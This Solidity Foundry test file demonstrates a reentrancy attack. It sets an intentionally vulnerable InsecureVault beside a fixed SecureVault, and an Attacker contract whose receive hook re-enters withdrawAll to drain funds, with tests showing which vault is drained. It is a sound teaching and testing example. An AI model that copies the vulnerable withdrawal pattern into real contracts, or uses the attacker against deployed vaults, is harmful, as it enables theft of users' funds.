// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

interface IVault {
    function deposit() external payable;

    function getBalance() external view returns (uint256);

    function withdrawAll() external;
}

abstract contract VaultBase is IVault {
    mapping(address => uint256) internal balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function getBalance() external view returns (uint256) {
        return balances[msg.sender];
    }
}

contract InsecureVault is VaultBase {
    function withdrawAll() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");

        (bool success,) = msg.sender.call{value: balance}("");
        require(success, "Falied to send Ether");

        balances[msg.sender] = 0;
    }
}

contract SecureVault is VaultBase {
    function withdrawAll() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");

        balances[msg.sender] = 0;
        (bool success,) = msg.sender.call{value: balance}("");
        require(success, "Falied to send Ether");
    }
}

contract Attacker {
    IVault _vault;

    constructor(IVault vault_) {
        _vault = vault_;
    }

    receive() external payable {
        if (_vault.getBalance() > 0 && address(_vault).balance > 0) {
            _vault.withdrawAll();
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        _vault.deposit{value: msg.value}();
        _vault.withdrawAll();
    }
}

contract ReentrancyAttackTest is Test {
    function test_AttackToInsecureVault() external {
        IVault vault = new InsecureVault();
        Attacker attacker = new Attacker(vault);

        vault.deposit{value: 2 ether}();

        uint256 preBalance = address(attacker).balance;
        assertEq(preBalance, 0);

        attacker.attack{value: 1 ether}();
        uint256 postBalance = address(attacker).balance;
        assertEq(postBalance, 3 ether);
    }

    function test_AttackToSecureVault() external {
        IVault vault = new SecureVault();
        Attacker attacker = new Attacker(vault);

        vault.deposit{value: 2 ether}();

        uint256 preBalance = address(attacker).balance;
        assertEq(preBalance, 0);

        attacker.attack{value: 1 ether}();
        uint256 postBalance = address(attacker).balance;
        assertEq(postBalance, 1 ether);
    }
}
